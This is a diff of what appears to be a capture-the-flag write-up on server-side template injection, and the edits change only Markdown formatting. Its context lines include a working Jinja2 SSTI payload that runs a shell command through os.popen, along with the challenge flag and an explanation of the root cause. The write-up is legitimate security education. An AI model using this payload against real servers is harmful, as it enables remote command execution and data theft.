@@ -116,15 +116,15 @@
  Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
  ![flag output](../assets/Garfield_5.png)
 
----
+ ---
 
-### Flag
+ ### Flag
 
     uscctf{ssti_rules_mwahaha}
 
----
+ ---
 
-### Why SSTI is Dangerous
+ ### Why SSTI is Dangerous
 
     SSTI can allow attackers to:
     
@@ -135,9 +135,9 @@
     
     In this challenge, it allowed command execution and reading the flag file.
     
-    ---
+ ---
 
-### Root Cause
+ ### Root Cause
 
     The vulnerability exists because:
     
@@ -147,8 +147,8 @@
     
     This means user input is treated as code.
     
-    ---
+ ---
 
-### Final Thought
+ ### Final Thought
 
 This challenge shows how dangerous it is to render user-controlled input inside templates. Even a small mistake can lead to full server compromise.  
